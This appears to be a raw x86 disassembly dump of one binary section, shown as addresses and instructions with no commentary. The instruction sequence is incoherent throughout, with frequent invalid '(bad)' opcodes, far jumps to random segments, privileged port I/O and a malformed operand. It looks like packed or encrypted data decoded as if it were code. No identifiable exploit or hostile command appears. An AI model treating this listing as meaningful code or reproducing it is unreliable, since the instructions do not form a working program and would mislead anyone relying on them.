  4127d2:	pop    DWORD PTR [edx-0x39f7d41]
  4127d8:	pop    ss
  4127d9:	ror    esi,0x75
  4127dc:	push   ss
  4127dd:	ja     0x4127b9
  4127df:	shr    BYTE PTR [eax],1
  4127e1:	push   eax
  4127e2:	(bad)  
  4127e3:	jns    0x4127f9
  4127e5:	in     eax,0xde
  4127e7:	test   DWORD PTR [eax+0x524b191e],0xaaa669c9
  4127f1:	xor    bh,BYTE PTR [ebp-0x25]
  4127f4:	xor    eax,DWORD PTR cs:[ecx]
  4127f7:	jns    0x412821
  4127f9:	dec    esi
  4127fa:	dec    ebp
  4127fb:	cs push ebp
  4127fd:	xchg   esi,eax
  4127fe:	pop    ebx
  4127ff:	dec    ebx
  412800:	jnp    0x41281e
  412802:	or     eax,0xb402a3b9
  412807:	fisttp QWORD PTR [esi]
  412809:	mov    eax,0x66e01607
  41280e:	mov    BYTE PTR [eax+0x22],ah
  412811:	loope  0x4127c9
  412813:	push   esp
  412814:	lods   al,BYTE PTR ds:[esi]
  412815:	ja     0x41281d
  412817:	push   ebx
  412818:	test   dh,0x4d
  41281b:	sbb    cl,BYTE PTR [eax]
  41281d:	test   al,0xb0
  41281f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412820:	jno    0x412840
  412822:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  412824:	std    
  412825:	xchg   edx,eax
  412826:	or     al,0xd
  412828:	push   ebp
  412829:	adc    edi,edi
  41282b:	ds ja  0x41281f
  41282e:	mov    ah,0x90
  412830:	mov    eax,0x469934eb
  412835:	sar    DWORD PTR [ebx+eiz*8],cl
  412838:	pop    esi
  412839:	mov    ch,0x24
  41283b:	call   0xc648:0x388fd4d5
  412842:	cmp    eax,0x981b9e41
  412847:	push   esp
  412848:	clc    
  412849:	ror    DWORD PTR [esi+0x47f659b3],0x8c
  412850:	mov    ecx,0x66cbd23e
  412855:	xchg   esi,eax
  412856:	arpl   WORD PTR [esp+esi*8],ax
  412859:	arpl   WORD PTR [edx-0x24],si
  41285c:	xchg   esp,eax
  41285d:	sub    ah,BYTE PTR [ebx-0x28e104a9]
  412863:	imul   ecx,DWORD PTR [ebx],0xc1667e34
  412869:	fcomp  DWORD PTR [ebp-0x37]
  41286c:	shr    BYTE PTR [edx-0x68656c35],cl
  412872:	xchg   ecx,eax
  412873:	test   BYTE PTR [ebx+0x76],al
  412876:	out    0x42,al
  412878:	push   esi
  412879:	and    esp,DWORD PTR [ecx+0x20]
  41287c:	mov    bl,0x5d
  41287e:	pop    ss
  41287f:	jb     0x4128ab
  412881:	stos   DWORD PTR es:[edi],eax
  412882:	jmp    0x1273:0x5eae487a
  412889:	retf   0x6d4b
  41288c:	pop    edi
  41288d:	lock ins BYTE PTR es:[edi],dx
  41288f:	dec    ebp
  412890:	sbb    esi,ebp
  412892:	lods   eax,DWORD PTR ds:[esi]
  412893:	pop    ebp
  412894:	rol    esp,cl
  412896:	push   esi
  412897:	out    dx,al
  412898:	call   0xbba940d6
  41289d:	lods   al,BYTE PTR ds:[esi]
  41289e:	adc    BYTE PTR [ecx+0x4e8b7cc1],cl
  4128a4:	jmp    0x8fa7:0x18ffd07b
  4128ab:	and    ebx,DWORD PTR [ebp+0x32]
  4128ae:	fnclex 
  4128b0:	gs enter 0x5a36,0x54
  4128b5:	adc    eax,0x3f82430e
  4128ba:	and    eax,0xfc336798
  4128bf:	ds loope 0x4128bc
  4128c2:	mov    ebx,0x3cd53990
  4128c7:	call   0xa38d:0x5fde6545
  4128ce:	sbb    eax,DWORD PTR [ecx-0x59be438]
  4128d4:	adc    ebx,ecx
  4128d6:	jns    0x4128cc
  4128d8:	inc    ebx
  4128d9:	push   eax
  4128da:	ins    DWORD PTR es:[edi],dx
  4128db:	sti    
  4128dc:	in     eax,0xa7
  4128de:	repnz scas eax,DWORD PTR es:[edi]
  4128e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128e1:	pop    ebx
  4128e2:	adc    al,0x9f
  4128e4:	sub    al,0xce
  4128e6:	fist   WORD PTR [eax-0x69]
  4128e9:	fst    QWORD PTR [eax+0x43dbcf90]
  4128ef:	int3   
  4128f0:	div    cl
  4128f2:	in     eax,dx
  4128f3:	pop    ss
  4128f4:	dec    ebp
  4128f5:	popf   
  4128f6:	mov    ecx,0xbfcd8080
  4128fb:	retf   
  4128fc:	xor    eax,0x82090990
  412901:	sub    al,0xb1
  412904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412905:	jmp    0xd364fccd
  41290a:	dec    eax
  41290b:	fld    st(4)
  41290d:	(bad)  
  41290e:	sar    BYTE PTR [edx],cl
  412910:	mov    ah,0xe2
  412912:	leave  
  412913:	mov    al,ds:0x18ce182a
  412918:	and    al,0x29
  41291a:	scas   al,BYTE PTR es:[edi]
  41291b:	push   ds
  41291c:	call   0x61c2:0x9ece9d6a
  412923:	dec    ebp
  412924:	inc    esp
  412925:	pop    eax
  412926:	loopne 0x41299f
  412928:	dec    esi
  412929:	scas   eax,DWORD PTR es:[edi]
  41292a:	out    dx,eax
  41292b:	xor    edx,DWORD PTR [edi-0x3086e8f3]
  412931:	push   es
  412932:	jecxz  0x4128c4
  412934:	hlt    
  412935:	xor    esi,0xf88bd6ba
  41293b:	cmp    esi,DWORD PTR [edx]
  41293d:	cs push ebp
  41293f:	arpl   WORD PTR ds:0xcffecdde,di
  412945:	xor    edx,DWORD PTR [esi]
  412947:	jmp    0xcc08:0x962602c3
  41294e:	sub    al,0x2a
  412950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412951:	data16 jge 0x4129ca
  412954:	test   eax,0xd243102f
  412959:	dec    ebx
  41295a:	or     eax,0x6621cdcc
  41295f:	imul   eax,DWORD PTR [edx+esi*8],0x3f40be9
  412966:	inc    esp
  412967:	pop    edx
  412968:	inc    ebp
  412969:	sub    DWORD PTR [ecx],edx
  41296b:	or     edi,DWORD PTR [ebx+0x7e387df7]
  412971:	add    DWORD PTR [edi-0x5099a73b],eax
  412977:	mov    dh,0x53
  412979:	and    DWORD PTR [edx-0xd227762],ecx
  41297f:	sahf   
  412980:	jmp    0x41298b
  412982:	pop    ebx
  412983:	inc    esi
  412984:	push   edi
  412985:	jl     0x41295f
  412987:	stos   DWORD PTR es:[edi],eax
  412988:	add    eax,0x2e7fed04
  41298d:	dec    BYTE PTR [esi-0x9]
  412990:	sbb    cl,BYTE PTR [edx+eax*8+0x624d556a]
  412997:	xor    DWORD PTR [esi-0x78],0xffffffc7
  41299b:	mov    bh,0xcf
  41299d:	pop    esp
  41299e:	dec    eax
  41299f:	fidiv  WORD PTR [ecx+0x72514638]
  4129a5:	push   ebx
  4129a6:	dec    esi
  4129a7:	mov    dh,0x95
  4129a9:	loop   0x412a29
  4129ab:	xor    DWORD PTR [eax+0x43],esp
  4129ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129af:	or     BYTE PTR [ecx+0x16],dh
  4129b2:	cwde   
  4129b3:	test   BYTE PTR [ebx+ecx*8],0x19
  4129b7:	jno    0x412a0a
  4129b9:	pop    ebx
  4129ba:	jns    0x4129a8
  4129bc:	inc    ebx
  4129bd:	or     ah,ah
  4129bf:	mov    ecx,0xd4784eda
  4129c4:	jb     0x412a26
  4129c6:	das    
  4129c7:	in     al,0x88
  4129c9:	mov    dl,0x82
  4129cb:	xor    bl,BYTE PTR [ebp-0x7b]
  4129ce:	stos   DWORD PTR es:[edi],eax
  4129cf:	data16 shl bh,1
  4129d2:	cmc    
  4129d3:	popf   
  4129d4:	or     DWORD PTR [ebp-0x1d68d199],ebp
  4129da:	loop   0x412a03
  4129dc:	into   
  4129dd:	or     BYTE PTR [edi+0x48],cl
  4129e0:	fst    QWORD PTR [edi-0x16]
  4129e3:	add    cl,BYTE PTR [esi+edi*4+0x50ca1901]
  4129ea:	mov    ebp,0x9af6fcfa
  4129ef:	mov    al,0x20
  4129f1:	aas    
  4129f2:	pop    es
  4129f3:	lock les edi,FWORD PTR [edx+0x28]
  4129f7:	xchg   DWORD PTR [edx+0x1b],esp
  4129fa:	sti    
  4129fb:	adc    al,0x16
  4129fd:	and    BYTE PTR [eax+0x1cc219bc],dh
  412a03:	push   edi
  412a04:	sbb    al,0x5b
  412a06:	or     edx,DWORD PTR [edx-0x2ce8fdfb]
  412a0c:	push   edi
  412a0d:	xchg   esi,eax
  412a0e:	cli    
  412a0f:	das    
  412a10:	add    eax,0x9ccea222
  412a15:	(bad)  
  412a16:	aam    0xc2
  412a18:	pushf  
  412a19:	add    edx,DWORD PTR [ebp+eax*8-0x4fafd3a8]
  412a20:	in     al,dx
  412a21:	sub    al,0x25
  412a23:	in     al,0x4c
  412a25:	lahf   
  412a26:	jg     0x412aa4
  412a28:	fild   QWORD PTR [eax+0xa]
  412a2b:	aas    
  412a2c:	enter  0x5ac7,0x7a
  412a30:	lock mov WORD PTR [edx+ebx*2+0xa6c75cb],cs
  412a38:	in     al,0x8e
  412a3a:	ja     0x412aac
  412a3c:	lods   al,BYTE PTR ds:[esi]
  412a3d:	pop    ebx
  412a3e:	mov    cl,0x42
  412a40:	test   BYTE PTR [ebp+0x4ed32c64],bh
  412a46:	mov    bl,0x7d
  412a48:	and    eax,0x411c8cff
  412a4d:	xchg   ecx,eax
  412a4e:	or     BYTE PTR [ecx],0x97
  412a51:	(bad)  
  412a52:	lahf   
  412a53:	xchg   DWORD PTR [ebx-0x55916df0],edx
  412a59:	(bad)  
  412a5a:	repz mov ebp,0x5b006f06
  412a60:	retf   
  412a61:	sbb    edi,edi
  412a63:	fimul  DWORD PTR [edx+0x4]
  412a66:	mov    ah,0x46
  412a68:	jb     0x412aa9
  412a6a:	inc    ebx
  412a6b:	es retf 0x74aa
  412a6f:	in     al,dx
  412a70:	xor    dh,0xc7
  412a73:	mov    ds:0x6a3e4b0b,eax
  412a78:	shl    DWORD PTR [edi-0x3b],0x74
  412a7c:	out    0xa8,eax
  412a7e:	jae    0x412a4e
  412a80:	xor    BYTE PTR [ecx],al
  412a82:	test   ah,dh
  412a84:	jns    0x412acf
  412a86:	cmp    cl,0x8f
  412a89:	fisttp DWORD PTR [ebp-0x6b]
  412a8c:	loop   0x412ad8
  412a8e:	push   ds
  412a8f:	dec    esp
  412a90:	jb     0x412a81
  412a92:	inc    ebp
  412a93:	cmp    DWORD PTR [edi+0x557a8b1f],0xffffffec
  412a9a:	lods   al,BYTE PTR ds:[esi]
  412a9b:	dec    ecx
  412a9c:	jne    0x412a76
  412a9e:	pop    ds
  412a9f:	dec    esi
  412aa0:	stos   BYTE PTR es:[edi],al
  412aa1:	jmp    0x70fe658
  412aa6:	xor    eax,0xb2a3949d
  412aab:	mov    bl,0x40
  412aad:	mov    ?,eax
  412aaf:	lock outs dx,BYTE PTR ds:[esi]
  412ab1:	sbb    eax,0xe135c391
  412ab6:	jl     0x412ae6
  412ab8:	fistp  WORD PTR [edi]
  412aba:	jecxz  0x412a90
  412abc:	mov    ds:0xbaee1c7f,al
  412ac1:	or     eax,0x635d3e7e
  412ac6:	cmc    
  412ac7:	movd   DWORD PTR [ebx],mm1
  412aca:	or     edi,ebp
  412acc:	pop    ecx
  412acd:	xchg   ecx,ecx
  412acf:	cli    
  412ad0:	mov    ecx,0x2dece4fe
  412ad5:	lea    esi,[ecx]
  412ad7:	dec    ebx
  412ad8:	mov    dl,0x42
  412ada:	ret    0x26e8
  412add:	lock jge 0x412a8a
  412ae0:	mov    ebp,0x374f8efe
  412ae5:	stc    
  412ae6:	pop    ebx
  412ae7:	cwde   
  412ae8:	xor    dh,0x1f
  412aeb:	in     al,0x2
  412aed:	sbb    BYTE PTR [ecx+0x72e089],0x65
  412af4:	and    ch,BYTE PTR [ecx]
  412af6:	pop    ecx
  412af7:	or     eax,0x7af6bde4
  412afc:	mov    al,ds:0xd7a0b3db
  412b01:	scas   eax,DWORD PTR es:[edi]
  412b02:	mov    dl,0x64
  412b04:	adc    DWORD PTR [esi-0x23],eax
  412b07:	dec    ebx
  412b08:	arpl   WORD PTR [ecx+ebp*2+0x74d9f11d],si
  412b0f:	sub    eax,0xa73a8de8
  412b14:	xor    bh,0xe8
  412b17:	dec    esp
  412b18:	sar    DWORD PTR [edx+0x22],cl
  412b1b:	ret    0xaff5
  412b1e:	push   es
  412b1f:	aad    0xe
  412b21:	add    al,0x8e
  412b23:	inc    edx
  412b24:	pop    es
  412b25:	(bad)  
  412b26:	aas    
  412b27:	sbb    al,0x91
  412b29:	lea    esi,[edx]
  412b2b:	je     0x412abc
  412b2d:	mov    DWORD PTR [esi+ebx*4+0x21ad0872],ebx
  412b34:	mov    eax,0x729f1420
  412b3a:	add    DWORD PTR [esi-0x64],0x35
  412b3e:	lahf   
  412b3f:	xor    eax,0x9246f1d8
  412b44:	sti    
  412b45:	lock adc ecx,ebp
  412b48:	jbe    0x412b90
  412b4a:	and    esp,esi
  412b4c:	and    BYTE PTR ds:[esi],0x4d
  412b50:	jb     0x412ae4
  412b52:	cs inc edi
  412b54:	out    dx,eax
  412b55:	test   al,0x13
  412b57:	inc    ebx
  412b58:	in     eax,dx
  412b59:	jle    0x412b57
  412b5b:	inc    ebp
  412b5c:	lods   al,BYTE PTR ds:[esi]
  412b5d:	sbb    ebp,ebp
  412b5f:	jecxz  0x412b11
  412b61:	enter  0xbca,0xc7
  412b65:	mov    edx,eax
  412b67:	or     DWORD PTR [edi-0x37641cc5],0xec7adf3d
  412b71:	sub    eax,DWORD PTR [esi+0x64]
  412b74:	je     0x412b69
  412b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b77:	adc    BYTE PTR [edx-0x5a],bl
  412b7a:	xchg   ebx,eax
  412b7b:	dec    ecx
  412b7c:	mov    bh,0xa1
  412b7e:	mov    eax,0xdca38a8a
  412b83:	int    0x4d
  412b85:	inc    esi
  412b86:	ds inc eax
  412b88:	cmp    edi,edi
  412b8a:	outs   dx,DWORD PTR ds:[esi]
  412b8b:	sub    BYTE PTR [ecx-0xc],0xbe
  412b8f:	mov    eax,0xcd13e79e
  412b94:	mov    ds:0x6e2548ef,al
  412b99:	movaps xmm1,XMMWORD PTR [ebx]
  412b9c:	jno    0x412b8b
  412b9e:	add    eax,0x81b3665a
  412ba3:	inc    ebx
  412ba4:	test   BYTE PTR [ebx-0x68148a1c],cl
  412baa:	cmp    BYTE PTR [ecx-0x1c4f7dd2],ch
  412bb0:	rcl    DWORD PTR [ecx-0x3cd9f32b],0x46
  412bb7:	or     BYTE PTR [eax],ch
  412bb9:	cmp    al,0xec
  412bbb:	ret    0x4fc5
  412bbe:	push   cs
  412bbf:	jg     0x412c2e
  412bc1:	(bad)  
  412bc2:	cs loopne 0x412b48
  412bc5:	sub    BYTE PTR [edi+0x2f],0xb0
  412bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bca:	adc    al,0xd4
  412bcc:	add    edi,DWORD PTR [ecx]
  412bce:	cmp    eax,0x6a9a66d6
  412bd3:	dec    esp
  412bd4:	and    eax,0x34ed230e
  412bd9:	in     eax,dx
  412bda:	sub    eax,0x2b5f1982
  412bdf:	mov    eax,ds:0xdc45e5e4
  412be4:	inc    ecx
  412be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412be6:	leave  
  412be7:	push   ss
  412be8:	jg     0x412b95
  412bea:	jmp    0x412b6d
  412bec:	push   edi
  412bed:	daa    
  412bee:	pop    edi
  412bef:	ret    
  412bf0:	pushf  
  412bf1:	sti    
  412bf2:	and    ah,bh
  412bf4:	inc    ecx
  412bf5:	js     0x412bc9
  412bf7:	rol    DWORD PTR [eax+0x6ca2028],0xe3
  412bfe:	imul   DWORD PTR [edx*4+0x7aa9e9d9]
  412c05:	sbb    bh,BYTE PTR [ecx]
  412c07:	pushf  
  412c08:	dec    ebp
  412c09:	outs   dx,DWORD PTR ds:[esi]
  412c0a:	addr16 pop ss
  412c0c:	mov    WORD PTR [eax],es
  412c0e:	cld    
  412c0f:	push   esi
  412c10:	push   edx
  412c11:	inc    ebp
  412c12:	jmp    0x412b9b
  412c14:	mov    ch,0x96
  412c16:	mov    cl,0xf7
  412c18:	fs inc esp
  412c1a:	or     ebp,DWORD PTR [eax-0x416570b2]
  412c20:	mov    DWORD PTR [ebx],edx
  412c22:	or     BYTE PTR [ecx+0x4a12454a],0xcc
  412c29:	ds xor al,0x7d
  412c2c:	or     dl,BYTE PTR [ecx]
  412c2e:	call   0xf567:0x30b2850
  412c35:	inc    eax
  412c36:	shr    cl,1
  412c38:	sub    edx,eax
  412c3a:	stos   BYTE PTR es:[edi],al
  412c3b:	lahf   
  412c3c:	data16 sbb al,0xdb
  412c3f:	and    eax,edx
  412c41:	adc    DWORD PTR [ecx-0x21],0x4f
  412c45:	mov    al,ds:0xe2dd0b58
  412c4a:	test   eax,0xb2849371
  412c4f:	pop    esp
  412c50:	mov    bl,0xa8
  412c52:	pop    ecx
  412c53:	mov    ds:0xefca530d,al
  412c58:	in     eax,0xf4
  412c5a:	mov    al,0x9b
  412c5c:	lea    esi,[ebx+ebx*1-0x1a1d0147]
  412c63:	call   0x7a72:0x108c2408
  412c6a:	in     eax,dx
  412c6b:	push   ebx
  412c6c:	loop   0x412c01
  412c6e:	cmp    BYTE PTR [ecx+0x39],dl
  412c71:	test   eax,0x92eb1c2f
  412c76:	jns    0x412c21
  412c78:	and    esi,DWORD PTR [ebx+eax*4-0x366074f7]
  412c7f:	jne    0x412cc7
  412c81:	push   ds
  412c82:	cwde   
  412c83:	cli    
  412c84:	xchg   esp,eax
  412c85:	inc    esi
  412c86:	adc    esi,DWORD PTR [edi-0x6081b68b]
  412c8c:	mov    al,ds:0xba57c833
  412c91:	sub    DWORD PTR [edi+edi*2],ebx
  412c94:	test   al,ah
  412c96:	loope  0x412c1d
  412c98:	lock (bad) 
  412c9a:	push   esp
  412c9b:	and    BYTE PTR [esi+0x1],dh
  412c9e:	(bad)  
  412c9f:	pop    esp
  412ca0:	out    0x7f,eax
  412ca2:	jecxz  0x412ca8
  412ca4:	ja     0x412d09
  412ca6:	je     0x412c7f
  412ca8:	inc    edx
  412ca9:	xchg   esp,eax
  412caa:	iret   
  412cab:	scas   al,BYTE PTR es:[edi]
  412cac:	jne    0x412d0b
  412cae:	sbb    ch,bl
  412cb0:	call   0x52e41c48
  412cb5:	out    0xdc,al
  412cb7:	adc    al,0x1b
  412cb9:	jge    0x412c4d
  412cbb:	jns    0x412cf8
  412cbd:	sbb    BYTE PTR [edi],bl
  412cbf:	xchg   edx,eax
  412cc0:	ficom  DWORD PTR [eax-0x52]
  412cc3:	pusha  
  412cc4:	xor    edx,eax
  412cc6:	sub    DWORD PTR [edx+0x36],esp
  412cc9:	adc    edi,eax
  412ccb:	xor    eax,0xc60e468b
  412cd0:	sub    ch,0x37
  412cd3:	lea    ecx,[esi]
  412cd5:	sub    bh,ch
  412cd7:	xchg   edx,eax
  412cd8:	jg     0x412cad
  412cda:	fild   WORD PTR [ebx]
  412cdc:	jns    0x412cdf
  412cde:	mov    ecx,0x70c51166
  412ce3:	sub    al,BYTE PTR [ecx+0x76545589]
  412ce9:	add    esi,DWORD PTR [esi+0xa70ca49]
  412cef:	mov    ebx,0x31f5afb9
  412cf4:	fwait
  412cf5:	push   es
  412cf6:	pusha  
  412cf7:	push   ds
  412cf8:	sub    al,0x4
  412cfa:	xchg   ebp,eax
  412cfb:	mov    ah,BYTE PTR [eax]
  412cfd:	mov    eax,ds:0xf4087829
  412d02:	lods   al,BYTE PTR ds:[esi]
  412d03:	inc    eax
  412d04:	push   ebp
  412d05:	mov    ds:0xe6e2c37,al
  412d0a:	jg     0x412ce9
  412d0c:	rcl    DWORD PTR ds:0x2baa8b8d,1
  412d12:	xor    ebp,DWORD PTR [esi-0x4711e067]
  412d18:	jp     0x412d2b
  412d1a:	inc    edx
  412d1b:	jbe    0x412d25
  412d1d:	mov    al,BYTE PTR [ecx]
  412d1f:	in     eax,0xdc
  412d21:	cdq    
  412d22:	fsubr  st(1),st
  412d24:	pop    edx
  412d25:	(bad)  
  412d27:	add    DWORD PTR [ebx-0x3e],ebx
  412d2a:	mov    ebp,0xd8f4b3a8
  412d2f:	fisubr WORD PTR [esi]
  412d31:	adc    dl,0xad
  412d34:	dec    esi
  412d35:	inc    ebx
  412d36:	xchg   edx,eax
  412d37:	add    eax,ebx
  412d39:	push   ss
  412d3a:	xor    bh,BYTE PTR [eax+0x3a]
  412d3d:	push   edi
  412d3e:	inc    ebp
  412d3f:	mov    esp,0x4f228811
  412d44:	in     al,dx
  412d45:	push   ss
  412d46:	xchg   ebp,eax
  412d47:	push   0x1
  412d49:	pop    eax
  412d4a:	loopne 0x412da2
  412d4c:	(bad)  
  412d4d:	cmp    esi,eax
  412d4f:	sbb    BYTE PTR [eax+edi*2-0x4d],ah
  412d53:	jge    0x412ce6
  412d55:	les    ebx,FWORD PTR [ebx-0x67]
  412d58:	ret    
  412d59:	rol    BYTE PTR [edi+0x10],1
  412d5c:	adc    al,0xb4
  412d5e:	xor    BYTE PTR [ebp+0x7334591],0x73
  412d65:	(bad)  
  412d66:	push   0x3d
  412d68:	pop    esp
  412d69:	rcl    BYTE PTR [esi+0x73],cl
  412d6c:	add    eax,0x8c50348d
  412d71:	inc    edi
  412d72:	repnz test DWORD PTR ds:0x466b8550,0x9691ea09
  412d7d:	retf   0x8925
  412d80:	test   eax,0xc738584f
  412d85:	enter  0x3c48,0x2
  412d89:	lds    esi,FWORD PTR [ebx]
  412d8b:	pushf  
  412d8c:	xlat   BYTE PTR ds:[ebx]
  412d8d:	retf   
  412d8e:	gs out 0x73,eax
  412d91:	scas   eax,DWORD PTR es:[edi]
  412d92:	ror    DWORD PTR [eax],0x74
  412d95:	pop    edi
  412d96:	int3   
  412d97:	dec    esp
  412d98:	pop    ebp
  412d99:	in     eax,0x7c
  412d9b:	(bad)  
  412d9c:	aad    0xeb
  412d9e:	push   ss
  412d9f:	adc    eax,0x1d1ce6cb
  412da4:	cmp    BYTE PTR [edi],ah
  412da6:	jmp    0x4f7:0xc5abf6ef
  412dad:	enter  0xeb7d,0x9f
  412db1:	in     eax,0x74
  412db3:	jge    0x412d71
  412db5:	sub    edi,DWORD PTR [esi]
  412db7:	mov    ebx,0x4c02445c
  412dbc:	jle    0x412d77
  412dbe:	cmp    al,0x5d
  412dc0:	pop    ss
  412dc1:	pop    ecx
  412dc2:	(bad)  
  412dc3:	shr    DWORD PTR [edx],1
  412dc5:	imul   DWORD PTR [eax+0x59175557]
  412dcb:	retf   
  412dcc:	push   esp
  412dcd:	mov    edx,0xad3a7f19
  412dd2:	into   
  412dd3:	retf   0xaf34
  412dd6:	loop   0x412dfe
  412dd8:	leave  
  412dd9:	xchg   edi,eax
  412dda:	gs in  eax,0x11
  412ddd:	and    dh,al
  412ddf:	bound  ebp,QWORD PTR [eax-0x34]
  412de2:	pop    edx
  412de3:	and    al,0x3e
  412de5:	popa   
  412de6:	test   BYTE PTR [ecx-0x52],bh
  412de9:	dec    esp
  412dea:	outs   dx,DWORD PTR ds:[esi]
  412deb:	sbb    esp,DWORD PTR [edx+0x40fe3b92]
  412df1:	or     eax,0x8cd88d35
  412df6:	ds or  dl,ah
  412df9:	cmp    al,bl
  412dfb:	mov    ds:0x5285e774,eax
  412e00:	cmp    BYTE PTR [ecx],bh
  412e02:	or     BYTE PTR [ecx],0xbf
  412e05:	or     DWORD PTR [ebp-0x57],ebx
  412e08:	or     al,0x5e
  412e0a:	and    al,BYTE PTR [edi+0xaad06ef]
  412e10:	pop    ebp
  412e11:	cmp    BYTE PTR [edx+edi*4-0x4b],0xa2
  412e16:	int    0x3b
  412e18:	adc    BYTE PTR ss:[eax+0x546fe7ef],cl
  412e1f:	(bad)  
  412e20:	shl    BYTE PTR [edi],1
  412e22:	xor    cl,BYTE PTR [ecx+0x1fbd31ef]
  412e28:	mov    al,0xb0
  412e2a:	fnsave [eax-0x4d]
  412e2d:	inc    eax
  412e2e:	ret    0x8182
  412e31:	int3   
  412e32:	sar    BYTE PTR [ecx-0x5bc58998],1
  412e38:	xlat   BYTE PTR ds:[ebx]
  412e39:	adc    edx,DWORD PTR [edx]
  412e3b:	sub    al,0x1
  412e3d:	xor    DWORD PTR [ebx+0x54cd861f],edi
  412e43:	dec    ecx
  412e44:	stos   DWORD PTR es:[edi],eax
  412e45:	cli    
  412e46:	cmp    DWORD PTR [ebp-0x3126fb75],0x565646ae
  412e50:	(bad)  
  412e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e52:	cmp    eax,0xf7246ea2
  412e57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e58:	jp     0x412e8a
  412e5a:	mov    eax,DWORD PTR ds:0x89c323e2
  412e60:	jmp    0xd013b4d1
  412e65:	xor    edx,DWORD PTR [eax+eiz*8]
  412e68:	sbb    ebp,DWORD PTR [edx-0x66668fa3]
  412e6e:	mov    al,ds:0xa36f97d5
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	jmp    0x945f2de8
  412e79:	mov    ah,0xcc
  412e7b:	jns    0x412e0e
  412e7d:	nop
  412e7e:	sub    cl,0xfd
  412e81:	jne    0x412e41
  412e83:	scas   eax,DWORD PTR es:[edi]
  412e84:	aam    0xd1
  412e86:	xor    al,0xa3
  412e88:	xchg   ebx,eax
  412e89:	push   cs
  412e8a:	ds sub al,0xd3
  412e8d:	iret   
  412e8e:	mov    esp,0x87fb5c9c
  412e93:	cmp    eax,DWORD PTR [ecx+0x77428732]
  412e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e9a:	fstp   QWORD PTR [ebx]
  412e9c:	xchg   ebp,eax
  412e9d:	ret    0x68f4
  412ea0:	push   ds
  412ea1:	adc    dh,ch
  412ea3:	(bad)  [edi-0x62]
  412ea6:	mov    dl,0x27
  412ea8:	mov    bh,BYTE PTR [ecx]
  412eaa:	push   0xffffffdf
  412eac:	inc    eax
  412ead:	or     eax,0xd2c79ec7
  412eb2:	ds cld 
  412eb4:	test   BYTE PTR [eax],dl
  412eb6:	lods   al,BYTE PTR ds:[esi]
  412eb7:	push   esi
  412eb8:	out    0x24,eax
  412eba:	cmp    eax,0xde11de1
  412ebf:	aam    0x16
  412ec1:	in     al,dx
  412ec2:	jmp    0x5e8339fb
  412ec7:	(bad)
  412eca:	adc    cl,BYTE PTR [ebp+0x5bc4e792]
  412ed0:	mov    esi,0x296d6e87
  412ed5:	jo     0x412ee4
  412ed7:	jmp    0xb8947749
  412edc:	test   eax,0xd2b1e5ce
  412ee1:	push   ss
  412ee2:	adc    edi,DWORD PTR [ebx+0x5f]
  412ee5:	add    edx,esi
  412ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ee8:	jecxz  0x412e91
  412eea:	sbb    eax,0x131377ae
  412eef:	aad    0x66
  412ef1:	mov    eax,0x213b9f07
  412ef6:	retf   0x7142
  412ef9:	sbb    ecx,DWORD PTR [ebx+0x63affa9d]
  412eff:	lea    edx,[edx+esi*1]
  412f02:	or     esi,DWORD PTR [eax+0x5e]
  412f05:	cs pop esp
  412f07:	div    DWORD PTR [edi+ecx*8]
  412f0a:	pop    esi
  412f0b:	jmp    0x1be7:0x44b12b80
  412f12:	ins    DWORD PTR es:[edi],dx
  412f13:	adc    ebx,DWORD PTR [ecx]
  412f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f16:	ds stos DWORD PTR es:[edi],eax
  412f18:	js     0x412f02
  412f1a:	jnp    0x412eaa
  412f1c:	jl     0x412f93
  412f1e:	sbb    edx,DWORD PTR [esi-0x1434adb4]
  412f24:	mov    ebx,DWORD PTR [esp+ebx*4]
  412f27:	fild   DWORD PTR [esi]
  412f29:	or     eax,0x14c551ae
  412f2e:	or     al,0x19
  412f30:	xchg   edx,eax
  412f31:	fcmovnu st,st(7)
  412f33:	lahf   
  412f34:	xor    cl,BYTE PTR [edx]
  412f36:	push   0x9
  412f38:	aad    0x94
  412f3a:	sub    DWORD PTR [edi],esi
  412f3c:	inc    edx
  412f3d:	jp     0x412eef
  412f3f:	cmp    ecx,DWORD PTR [ecx-0x7a6b77c]
  412f45:	icebp  
  412f46:	cdq    
  412f47:	fs push eax
  412f49:	stos   DWORD PTR es:[edi],eax
  412f4a:	pusha  
  412f4b:	ins    DWORD PTR es:[edi],dx
  412f4c:	ja     0x412f45
  412f4e:	push   ecx
  412f4f:	mov    edx,0x28d62329
  412f54:	lock (bad) 
  412f56:	imul   ebp,DWORD PTR [esi-0x6d],0x71
  412f5a:	or     bl,BYTE PTR [edx+0x5b1cd050]
  412f60:	mov    bl,0x3a
  412f62:	jmp    DWORD PTR [edx+eiz*1+0x34]
  412f66:	xchg   ecx,eax
  412f67:	xor    eax,0x70cd2042
  412f6c:	xor    bh,dh
  412f6e:	enter  0x533d,0xe7
  412f72:	in     al,0xc5
  412f74:	in     al,dx
  412f75:	mov    eax,ds:0x6f23c203
  412f7a:	(bad)  
  412f7b:	ja     0x412fe3
  412f7d:	test   eax,0x9b4bb5cd
  412f82:	loop   0x413001
  412f84:	xor    DWORD PTR [edx+0xa1ab716],esi
  412f8a:	pop    DWORD PTR [eax+0x3142f37e]
  412f90:	(bad)  
  412f91:	aam    0x46
  412f93:	xchg   esi,eax
  412f94:	(bad)  
  412f95:	pushf  
  412f96:	(bad)  
  412f97:	cmp    DWORD PTR [eax+0x31a514e2],eax
  412f9d:	sbb    BYTE PTR [edx],bl
  412f9f:	dec    ebp
  412fa0:	(bad)  
  412fa1:	fist   DWORD PTR [eax+0x1f1fe9be]
  412fa7:	cld    
  412fa8:	lea    ebp,[esi+0x5420b201]
  412fae:	dec    esp
